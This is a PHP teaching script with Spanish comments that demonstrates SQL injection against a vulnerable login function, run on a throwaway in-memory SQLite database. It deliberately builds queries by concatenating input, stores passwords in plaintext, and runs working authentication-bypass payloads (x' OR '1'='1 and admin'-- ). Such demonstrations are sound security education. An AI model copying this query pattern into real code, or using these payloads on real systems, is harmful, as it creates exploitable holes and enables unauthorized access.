<?php
// SOLO LABORATORIO: reproduce el fragmento inseguro del enunciado para mostrar por qué falla.
// Base de datos de usar y tirar en memoria; no se conecta a nada externo.
declare(strict_types=1);
$db = new PDO('sqlite::memory:');
$db->exec("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
$db->exec("INSERT INTO users (username, password) VALUES ('ana','S3cr3t'),('admin','R00t!')");

// --- Código inseguro del enunciado (concatenación directa de la entrada) ---
function login_inseguro(PDO $db, string $user, string $pass): array {
    $query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
    echo "  SQL -> $query\n";
    return $db->query($query)->fetchAll(PDO::FETCH_ASSOC);
}

echo "[1] Entrada normal (ana / mala):\n";
$r = login_inseguro($db, 'ana', 'mala');
echo "  Filas: " . count($r) . " -> " . ($r ? 'ACCESO CONCEDIDO' : 'acceso denegado') . "\n\n";

echo "[2] Inyeccion con tautologia ( ' OR '1'='1 ):\n";
$r = login_inseguro($db, "x", "x' OR '1'='1");
echo "  Filas: " . count($r) . " -> " . ($r ? 'ACCESO CONCEDIDO (bypass)' : 'denegado') . "\n\n";

echo "[3] Inyeccion para entrar como admin ( admin'-- ):\n";
$r = login_inseguro($db, "admin'-- ", "lo que sea");
echo "  Filas: " . count($r) . " -> " . ($r ? 'ACCESO CONCEDIDO como ' . $r[0]['username'] : 'denegado') . "\n";
